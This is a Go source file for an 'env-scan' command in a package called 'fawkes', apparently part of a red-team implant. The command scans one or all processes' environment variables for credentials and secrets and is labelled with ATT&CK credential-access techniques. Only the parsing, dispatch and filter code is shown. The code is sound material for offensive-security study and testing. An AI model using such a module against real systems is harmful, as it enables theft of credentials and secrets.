//go:build !windows

package commands

import (
	"encoding/json"
	"strings"

	"fawkes/pkg/structs"
)

// EnvScanCommand scans process environment variables for leaked credentials.
type EnvScanCommand struct{}

func (c *EnvScanCommand) Name() string {
	return "env-scan"
}

func (c *EnvScanCommand) Description() string {
	return "Scan process environment variables for leaked credentials, API keys, and secrets (T1057/T1552.001)"
}

type envScanArgs struct {
	PID    int    `json:"pid"`    // specific PID (0 = scan all accessible)
	Filter string `json:"filter"` // optional: filter results by variable name pattern
}

func (c *EnvScanCommand) Execute(task structs.Task) structs.CommandResult {
	var args envScanArgs

	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			// Plain text: treat as filter
			args.Filter = task.Params
		}
	}

	if args.PID > 0 {
		return envScanSingleProcess(args.PID, args.Filter)
	}
	return envScanAllProcesses(args.Filter)
}

// envScanSingleProcess reads environment from a specific PID.
func envScanSingleProcess(pid int, filter string) structs.CommandResult {
	envVars, processName, err := readProcessEnviron(pid)
	if err != nil {
		return errorf("Failed to read environment for PID %d: %v", pid, err)
	}

	results := filterSensitiveVars(envVars, pid, processName)

	// Apply user filter if specified
	if filter != "" {
		results = applyEnvFilter(results, filter)
	}

	output := formatEnvScanResults(results, 1, 1)
	return successResult(output)
}

// applyEnvFilter filters results by variable name pattern.
func applyEnvFilter(results []envScanResult, filter string) []envScanResult {
	lowerFilter := strings.ToLower(filter)
	var filtered []envScanResult
	for _, r := range results {
		if strings.Contains(strings.ToLower(r.Variable), lowerFilter) ||
			strings.Contains(strings.ToLower(r.Category), lowerFilter) {
			filtered = append(filtered, r)
		}
	}
	return filtered
}
